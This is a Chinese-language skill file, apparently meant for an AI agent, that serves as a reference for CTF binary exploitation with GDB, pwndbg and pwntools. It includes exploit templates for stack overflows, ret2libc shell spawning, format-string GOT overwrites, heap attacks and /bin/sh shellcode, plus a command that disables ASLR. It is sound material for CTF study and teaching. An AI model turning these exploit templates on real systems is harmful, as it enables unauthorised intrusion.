---
name: pwn
description: GDB 与 Pwntools 完全指南 - 包含环境配置、调试命令、漏洞利用模板等
---

# GDB 与 Pwntools 完全指南

## 环境配置

### GDB
- **绝对路径**: `/usr/bin/gdb`
- **版本**: GNU gdb (Debian 17.1-4) 17.1
- **已加载插件**: pwndbg (209个命令)
- **启动命令**: `/usr/bin/gdb [程序名]`

### Pwntools
- **Python 路径**: `/usr/bin/python3` (Python 3.13.12)
- **虚拟环境**: `/root/pwn/pwn_ai/.venv/`
- **Pwntools 版本**: 4.15.0
- **模块路径**: `/root/pwn/pwn_ai/.venv/lib/python3.13/site-packages/pwn`
- **执行方式**: `.venv/bin/python [脚本名]`
- **Pwn 模板**: `.venv/bin/pwn`

### 静态分析工具
- **Objdump**: `/usr/bin/objdump` (GNU Binutils 2.45.50)
- **Readelf**: `/usr/bin/readelf` (GNU Binutils 2.45.50)
- **NM**: `/usr/bin/nm` (GNU Binutils 2.45.50)
- **Strings**: `/usr/bin/strings`
- **File**: `/usr/bin/file`
- **Checksec**: `/usr/bin/checksec`
- **Radare2**: `/usr/bin/r2` (r2 6.0.5)
- **Rabin2**: `/usr/bin/rabin2` (Radare2 二进制分析工具)

---

## 第一部分: 静态分析工具详解

### 1.1 文件识别 (file)

```bash
# 快速识别文件类型
/usr/bin/file ./binary

# 输出示例
# ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=xxx, for GNU/Linux 3.2.0, not stripped
```

### 1.2 安全保护检查 (checksec)

```bash
# 检查二进制保护机制
/usr/bin/checksec --file=./binary

# 输出含义
# RELRO: RELRO(重定位只读) - Partial/Full/No
# STACK CANARY: 栈金丝雀 - Enable/Disabled
# NX: NX(堆栈不可执行) - Enable/Disabled
# PIE: PIE(位置无关可执行) - Enable/No PIE
```

### 1.3 Readelf - ELF结构分析

```bash
# 查看ELF头信息
/usr/bin/readelf -h ./binary

# 查看程序头
/usr/bin/readelf -l ./binary

# 查看节区头
/usr/bin/readelf -S ./binary

# 查看符号表
/usr/bin/readelf -s ./binary
/usr/bin/readelf --syms ./binary

# 查看动态符号
/usr/bin/readelf -d ./binary

# 查看重定位信息
/usr/bin/readelf -r ./binary

# 查看特定函数
/usr/bin/readelf -s ./binary | grep -E "(win|main|vulnerable)"
```

### 1.4 Objdump - 反汇编与分析

```bash
# 反汇编所有代码
/usr/bin/objdump -d ./binary

# 反汇编特定函数
/usr/bin/objdump -d ./binary | grep -A 30 "win>"

# 反汇编只显示特定段
/usr/bin/objdump -d -j .text ./binary

# 显示节区内容（十六进制）
/usr/bin/objdump -s ./binary
/usr/bin/objdump -s -j .rodata ./binary  # 查看只读数据

# 显示所有头信息
/usr/bin/objdump -x ./binary

# 显示反汇编并嵌入源代码（需编译时加-g）
/usr/bin/objdump -S ./binary

# 反汇编特定地址范围
/usr/bin/objdump -d ./binary --start-address=0x401000 --stop-address=0x401100
```

### 1.5 NM - 符号提取

```bash
# 显示所有符号
/usr/bin/nm ./binary

# 显示动态符号
/usr/bin/nm -D ./binary

# 按地址排序显示
/usr/bin/nm -n ./binary

# 只显示未定义符号（外部依赖）
/usr/bin/nm -u ./binary

# 显示调试符号
/usr/bin/nm -a ./binary

# 查找特定函数地址
/usr/bin/nm ./binary | grep win
```

### 1.6 Strings - 字符串提取

```bash
# 提取可打印字符串
/usr/bin/strings ./binary

# 显示字符串在文件中的偏移（十六进制）
/usr/bin/strings -t x ./binary

# 搜索特定关键词
/usr/bin/strings ./binary | grep -i flag

# 指定最小字符串长度（默认4）
/usr/bin/strings -n 10 ./binary

# 只搜索特定段
/usr/bin/strings -t x -d ./binary  # 只搜索数据段
```

### 1.7 Radare2 / Rabin2 - 高级静态分析

```bash
# 使用rabin2（radare2的静态分析工具）

# 查看符号表
/usr/bin/rabin2 -s ./binary

# 查看导入函数
/usr/bin/rabin2 -i ./binary

# 查看导出函数
/usr/bin/rabin2 -e ./binary

# 查看段信息
/usr/bin/rabin2 -S ./binary

# 查看所有信息
/usr/bin/rabin2 -I ./binary

# 反汇编函数
/usr/bin/r2 -d -A -c 'pdf @ sym.win' ./binary

# 使用r2进行交互式静态分析
/usr/bin/r2 -A ./binary
aaa        # 分析所有信息
 afl        # 列出所有函数
 pdf @sym.main  # 反汇编main函数
 iz         # 列出字符串
```

### 1.8 Pwntools 静态分析

```python
from pwn import *

# 加载ELF文件进行静态分析
elf = ELF('./binary')

# 获取函数地址
elf.symbols['win']           # 获取win函数地址
elf.symbols['main']
elf.symbols['__libc_start_main']

# 获取PLT/GOT地址
elf.plt['printf']            # PLT地址
elf.got['printf']            # GOT地址

# 搜索字符串/字节
next(elf.search(b'flag.txt'))
next(elf.search(b'/bin/sh'))

# 获取段信息
elf.get_section_by_name('.text').header.sh_addr
elf.get_section_by_name('.plt').header.sh_addr

# 检查安全保护
elf.checksec()

# 反汇编函数
code = elf.disasm(elf.symbols['win'], 0x100)
print(code)

# 获取架构信息
elf.arch                      # 'amd64', 'i386', etc.
elf.bits                      # 64, 32
elf.endian                    # 'little'
```

### 1.9 静态分析实战流程

```bash
# 完整的静态分析流程

# 步骤1: 文件类型识别
file ./binary

# 步骤2: 检查安全保护
checksec --file=./binary

# 步骤3: 提取字符串寻找线索
strings -t x ./binary | grep -E "(flag|password|secret)"

# 步骤4: 查看所有函数符号
readelf -s ./binary | grep FUNC
nm -D ./binary

# 步骤5: 反汇编关键函数
objdump -d ./binary | grep -A 50 "win>"
r2 -A -c 'pdf @sym.vulnerable' ./binary

# 步骤6: 查看数据段（硬编码值、地址等）
objdump -s -j .rodata ./binary
objdump -s -j .data ./binary
```

---

## 第二部分: GDB 调试详解

### 2.1 GDB 基础命令

#### 启动与退出
```bash
# 启动调试程序
/usr/bin/gdb ./程序名

# 附加到运行中的进程
/usr/bin/gdb -p [PID]

# 退出
quit 或 q 或 Ctrl+D
```

#### 程序控制
| 命令 | 说明 |
|------|------|
| `run [args]` 或 `r [args]` | 开始运行程序，可带参数 |
| `continue` 或 `c` | 继续运行直到下一个断点 |
| `next` 或 `n` | 单步执行(不进入函数) |
| `step` 或 `s` | 单步执行(进入函数) |
| `finish` | 运行到当前函数返回 |
| `until [位置]` 或 `u [位置]` | 运行到指定位置 |

#### 断点管理
```bash
# 在函数处设置断点
break main 或 b main

# 在地址处设置断点
break *0x401000 或 b *0x401000

# 在文件的某行设置断点
break 文件名:行号

# 条件断点
break main if argc > 1

# 查看所有断点
info breakpoints 或 info b

# 删除断点
delete 断点编号

# 禁用/启用断点
disable 断点编号
enable 断点编号

# 临时断点(只生效一次)
tbreak 函数名
```

#### 查看信息
```bash
# 查看寄存器
info registers 或 info r
info r rax rsp rip

# 查看特定寄存器
print $rax 或 p $rax
print/x $rsp   # 十六进制显示

# 查看栈
x/20gx $rsp    # 从rsp开始显示20个8字节(十六进制)
x/10i $rip     # 从rip开始反汇编10条指令

# 查看内存
x/10gx 0x401000    # 查看地址的10个8字节
x/s 0x401000       # 查看字符串
x/10i 0x401000     # 反汇编

# 查看函数/变量地址
p win              # 获取win函数地址
p &buffer          # 获取buffer变量地址

# 查看调用栈
backtrace 或 bt
frame 0            # 切换到栈帧0
```

#### 数据操作
```bash
# 修改内存值
set {int}0x401000 = 0x12345678

# 修改寄存器
set $rax = 0x1000

# 写入字符串
set {char[8]}0x401000 = "AAAAAAAB"
```

### 2.2 Pwndbg 增强命令

系统已安装 pwndbg，提供以下增强命令：

#### 栈与内存可视化
```bash
# 查看栈
stack     # 显示当前栈内容
stack l 50  # 显示栈附近的50个dwords

# 查看堆
heap      # 显示堆信息
bins      # 显示堆bins状态

# 搜索内存
search -t "byte" 0x7fffffff0000 "AAAA"  # 搜索字节
search -t "qword" 0x401000 0x401196     # 搜索8字节值

# 查看特定映射
vmmap     # 显示虚拟内存映射
near $rsp # 查看rsp附近的内存
```

#### 反汇编与分析
```bash
# 反汇编
disass main               # 反汇编main函数
disass 0x401000 +20       # 反汇编指定地址范围

# 代码流分析
context                   # 显示上下文(寄存器/栈/代码/反汇编)
context code 10           # 显示10行代码上下文

# 查找ROP gadgets
rop --grep "pop rdi"      # 搜索包含pop rdi的gadgets
```

#### Pwndbg 专用技巧
```bash
# 模式匹配查找偏移
cyclic 100                # 生成100字节循环模式
cyclic -l faaaa           # 查找"faaaa"在模式中的偏移

# 单条命令执行
pie                       # 查看PIE基址
checksec                  # 检查安全保护(需要额外插件)
```

### 2.3 GDB 实战场景

#### 场景1: 分析栈溢出程序
```bash
# 1. 反汇编vulnerable函数
/usr/bin/gdb ./stack_overflow
disass vulnerable

# 2. 在函数入口和read调用后设置断点
b *vulnerable+48     # read调用前
b *vulnerable+70     # read调用后

# 3. 运行并观察栈布局
r < <(python -c "print('A'*50)")
x/20gx $rbp-0x30     # 查看栈布局

# 4. 使用cyclic查找偏移
cyclic 100 > /tmp/pattern
r < /tmp/pattern
# 查看崩溃时的返回地址值
cyclic -l 0x6161616161616168  # 查找偏移
```

#### 场景2: 动态调试内存破坏
```bash
# 1. 设置硬件观察点
watch *(int*)0x401000    # 当地址内容变化时停止

# 2. 追踪函数调用
break win
commands
    silent
    printf "win() called!\\n"
    backtrace
    continue
end

# 3. 条件断点追踪循环
break loop if i == 100
```

#### 场景3: 绕过反调试
```bash
# 跳过检测代码
set $pc = 0x401200      # 修改程序计数器

# Patch内存
set {unsigned char}0x401000 = 0x90  # NOP指令
```

---

## 第三部分: Pwntools 详解

### 3.1 Pwntools 基础设置

```python
#!/usr/bin/env python3
from pwn import *

# 配置上下文
context.log_level = 'debug'    # 显示详细交互信息
context.arch = 'amd64'         # 设置架构: i386/amd64/arm
context.os = 'linux'           # 操作系统
context.endian = 'little'      # 字节序

# 快速配置模板
context.clear(arch='amd64')

# 日志级别: debug/info/warn/error/critical
```

### 3.2 数据打包与解包

```python
# 打包(数字 -> 字节)
p32(0x401196)      # b'\\x96\\x11\\x40\\x00' (32位小端)
p64(0x401196)      # b'\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00' (64位)
p8(0xff)           # b'\\xff' (8位)

# 大端序
p32(0x12345678, endian='big')

# 解包(字节 -> 数字)
u32(b'\\x96\\x11\\x40\\x00')   # 4196910
u64(b'\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00')  # 4196910

# 扁平化列表
flat([
    b'A' * 40,
    p64(0x401196),
    b'B' * 8
])

# 构造C风格数据结构
flat([
    b'/bin/sh\\x00',
    p32(0) * 3
])
```

### 3.3 Cyclic 模式生成

```python
# 生成循环模式
cyclic(50)           # 生成50字节循环模式
cyclic(100, n=8)     # 8字节一组模式

# 查找偏移
cyclic_find(0x61616161)      # 返回偏移量
cyclic_find(b'baaa')         # 也可以用字节串
cyclic_find(0x61616161, n=8) # 指定字节宽度

# 使用示例
pattern = cyclic(100)
offset = cyclic_find(0x6161616161616168)  # 找到返回地址偏移
payload = b'A' * offset + p64(win_addr)
```

### 3.4 进程与连接

```python
# 本地进程
p = process('./binary')
p = process('./binary', env={'LD_PRELOAD': './libc.so.6'})

# 远程连接
p = remote('127.0.0.1', 9999)
p = remote('ctf.example.com', 1337)

# GDB调试
p = gdb.debug('./binary', gdbscript='''
    b main
    b *0x401196
    c
''')

# 附加到现有进程
p = attach(1234)  # 通过PID

# 从文件读取
p = Tube.from_file('/tmp/input')

# 组合使用(自动切换本地/远程)
def get_conn():
    if args.REMOTE:
        return remote('ctf.example.com', 1337)
    return process('./binary')
```

### 3.5 交互与数据收发

```python
# 发送数据
p.send(b'A' * 40)          # 发送不换行
p.sendline(b'A' * 40)      # 发送并换行
p.sendlineafter(b'Input:', b'A' * 40)  # 等待提示后发送

# 接收数据
data = p.recv(1024)        # 接收最多1024字节
data = p.recvline()        # 接收一行
data = p.recvuntil(b'OK:') # 接收直到指定内容
data = p.recvall()         # 接收所有数据直到EOF

# 清空缓冲区
p.clean()

# 交互式shell
p.interactive()

# 超时设置
p.timeout = 5              # 设置超时为5秒
```

### 3.6 ELF 与 ROP 工具

```python
# 加载ELF文件
elf = ELF('./binary')

# 获取符号地址
elf.symbols['win']          # win函数地址
elf.symbols['main']
elf.plt['printf']           # PLT地址
elf.got['printf']           # GOT地址

# 获取段信息
elf.get_section_by_name('.text').header.sh_addr

# 搜索字符串
next(elf.search(b'/bin/sh'))

# ROP链构造
rop = ROP(elf)
rop.call(0x401196)          # 调用指定地址
rop.win()                   # 调用win函数
rop.printf(0x401000)        # 调用printf带参数
rop.system(next(elf.search(b'/bin/sh')))

print(rop.dump())           # 查看ROP链
payload = rop.chain()

# 寻找gadgets
rop.gadgets['pop rdi; ret'] # 搜索特定gadget
```

### 3.7 Shellcraft 生成器

```python
# 生成shellcode
shellcraft.sh()             # 生成/bin/sh shellcode
shellcraft.cat('/flag')     # 生成读取flag的shellcode
shellcraft.amd64.linux.sh() # 架构指定

# 自定义shellcode
shellcode = asm(shellcraft.sh())
shellcode = asm('''
    mov rdi, 0x401196
    call rdi
''')

# 执行shellcode
shellcode = shellcraft.execve("/bin/sh")
payload = asm(shellcode)
```

### 3.8 Libc 与泄漏利用

```python
# 加载libc
libc = ELF('./libc.so.6')
libc = elf.libc             # 从elf获取libc

# 计算基址
libc_base = libc_addr - libc.symbols['printf']
libc.address = libc_base    # 设置基址自动更新地址

# 获取函数地址
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

# one_gadget RCE
one_gadget = 0x10a45c       # one_gadget工具找到的地址
payload = p64(libc_base + one_gadget)

# 格式化字符串泄漏
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
payload = fmtstr_payload(6, {printf_got: win_addr})
```

### 3.9 高级技巧

```python
# 参数化exploit
def exploit(offset, win_addr):
    payload = flat([
        b'A' * offset,
        p64(win_addr)
    ])
    p.sendline(payload)

# ASLR绕过(多次尝试)
for i in range(100):
    try:
        p = process('./binary')
        # exploit code
        p.interactive()
    except:
        p.close()
        continue

# House of Spirit堆利用
chunk_size = 0x70
fake_chunk = p64(0) + p64(chunk_size + 1)
fake_chunk += p64(0) * 12  # padding

# 堆风水
for i in range(10):
    p.sendline(b'A' * 0x60)
```

### 3.10 命令行参数

```bash
# 运行时传递参数
.venv/bin/python exploit.py DEBUG    # 启用gdb调试
.venv/bin/python exploit.py REMOTE   # 使用远程连接
.venv/bin/python exploit.py NOLOG    # 禁用日志
.venv/bin/python exploit.py HOST=x.x.x.x PORT=1337

# 在脚本中使用
from pwn import *
args = sys.argv
if 'DEBUG' in args:
    context.log_level = 'debug'
if 'REMOTE' in args:
    p = remote(args.HOST, int(args.PORT))
```

---

## 第四部分: GDB + Pwntools 联合调试

### 4.1 自动化GDB调试

```python
from pwn import *

# 方式1: gdb.debug()
p = gdb.debug('./binary', gdbscript='''
    b *vulnerable+48
    b *win
    c
''')

# 方式2: process + attach()
p = process('./binary')
gdb.attach(p, gdbscript='''
    b *0x401196
    c
''')

# 方式3: 使用外部脚本文件
p = process('./binary')
gdb.attach(p, gdbscript=open('gdb_script.txt').read())

# 方式4: 在特定命令处停止
p = gdb.debug('./binary', gdbscript='''
    b main
    b win
    commands
        printf "win() called at %p\\\\n", $pc
        backtrace
    end
''')
```

### 4.2 开发/测试切换模板

```python
#!/usr/bin/env python3
from pwn import *

# ============ 配置区 ============
BINARY = './stack_overflow'
HOST = 'ctf.example.com'
PORT = 1337

def init_conn():
    '''初始化连接，自动切换本地/远程'''
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.DEBUG:
        return gdb.debug(BINARY, gdbscript='''
            b win
            c
        ''')
    else:
        return process(BINARY)

def exploit(p):
    '''核心利用逻辑'''
    # 1. 收集信息
    elf = ELF(BINARY)
    win_addr = elf.symbols['win']

    # 2. 计算偏移
    offset = 40

    # 3. 构造payload
    payload = flat([
        b'A' * offset,
        p64(win_addr)
    ])

    # 4. 发送
    p.sendline(payload)

# ============ 主程序 ============
if __name__ == '__main__':
    p = init_conn()

    if args.DEBUG:
        log.info('Debug mode - GDB attached')

    exploit(p)

    if not args.DEBUG:
        log.success('Flag captured!')
        print(p.recvallS())
    else:
        p.interactive()
```

### 4.3 实战调试流程

```bash
# 步骤1: 确定保护机制
.venv/bin/python -c "from pwn import *; print(checksec('./stack_overflow'))"

# 步骤2: 反汇编分析
/usr/bin/gdb -batch -ex "disass vulnerable" ./stack_overflow

# 步骤3: 使用cyclic找偏移
.venv/bin/python -c "from pwn import *; print(cyclic(100))" > /tmp/pattern
/usr/bin/gdb -batch -ex "r < /tmp/pattern" -ex "q" ./stack_overflow
.venv/bin/python -c "from pwn import *; print(cyclic_find(0x61616161))"

# 步骤4: 编写exploit并测试
.venv/bin/python exploit.py

# 步骤5: GDB验证
.venv/bin/python exploit.py DEBUG

# 步骤6: 远程攻击
.venv/bin/python exploit.py REMOTE
```

---

## 第五部分: 常见漏洞类型与利用

### 5.1 栈溢出 (Stack Overflow)
```python
# 基础栈溢出
offset = cyclic_find(0x61616161)
payload = b'A' * offset + p64(win_addr)

# 栈迁移
payload = flat([
    b'A' * offset,
    p64(fake_rbp),      # 覆盖saved rbp
    p64(leave_ret),     # leave; ret gadget
    p64(win_addr)
])
```

### 5.2 Ret2libc
```python
# ROP调用system
rop = ROP(elf)
rop.call(elf.plt['printf'], [elf.got['printf']])  # 泄露libc
rop.call(elf.symbols['main'])                     # 返回main

# 接收泄露
printf_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))
libc_base = printf_addr - libc.symbols['printf']
libc.address = libc_base

# 调用system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))
```

### 5.3 格式化字符串 (Format String)
```python
# 任意地址写
payload = fmtstr_payload(6, {elf.got['printf']: elf.symbols['win']})

# 泄露栈上值
payload = p64(0x401000) + b'%s'
p.sendline(payload)
leaked = u64(p.recv(6).ljust(8, b'\\x00'))
```

### 5.4 堆利用 (Heap Exploitation)
```python
# Fastbin Attack
# 1. 创建fake chunk
fake_chunk = p64(0) + p64(0x71)  # size=0x71

# 2. 触发double free
for i in range(7):
    alloc(0x60)
    free(0x60)

# 3. 分配到目标地址
malloc(fake_chunk)
malloc(p64(0x401000))  # GOT overwrite

# House of Spirit
payload = flat([
    p64(0),                 # prev_size
    p64(0x71),              # size (PREV_INUSE)
    p64(0),                 # fd
    p64(0),                 # bk
    b'A' * (0x60 - 0x20),   # padding
    p64(0x70)               # next chunk size
])
```

---

## 第六部分: 调试技巧汇总

### 6.1 常见问题解决

```bash
# 问题: 找不到terminfo数据库
# 解决: 设置TERM变量
export TERM=xterm
export TERM=xterm-256color

# 问题: PIE导致地址变化
# 解决: 打印PIE基址
gdb> pie
gdb> b *$rebase(win)

# 问题: ASLR导致地址变化
# 解决: 关闭ASLR或循环尝试
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### 6.2 调试速查表

| 场景 | GDB命令 | Pwntools代码 |
|------|---------|--------------|
| 找返回地址偏移 | `cyclic -l 值` | `cyclic_find(值)` |
| 查看函数地址 | `p 函数名` | `elf.symbols['函数名']` |
| 查看栈 | `x/20gx $rsp` | `print(p.recv())` |
| 反汇编 | `disass 函数` | `elf.displ('函数')` |
| 附加调试 | `attach PID` | `gdb.attach(p)` |
| 读内存 | `x/s 地址` | `p.read(地址, 长度)` |

---

## 附录: 完整模板

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pwn Template - GDB + Pwntools 综合模板
"""

from pwn import *

# ============ 配置 ============
context.update(
    arch='amd64',
    os='linux',
    log_level='info',
    terminal=['tmux', 'split-window', '-h']
)

BINARY = './binary'
LIBC = './libc.so.6'

def exploit():
    # 加载文件
    elf = ELF(BINARY)
    libc = ELF(LIBC) if LIBC else None

    # 建立连接
    if args.REMOTE:
        p = remote(args.HOST, int(args.PORT))
    elif args.GDB:
        p = gdb.debug(BINARY, gdbscript='''
            b main
            b win
            c
        ''')
    else:
        p = process(BINARY)

    # 利用代码
    # ...

    p.interactive()

if __name__ == '__main__':
    exploit()
```

---

**文档版本**: 1.0
**最后更新**: 2025-05-14
**适用环境**: Kali Linux 2025, Python 3.13, Pwntools 4.15.0, GDB 17.1
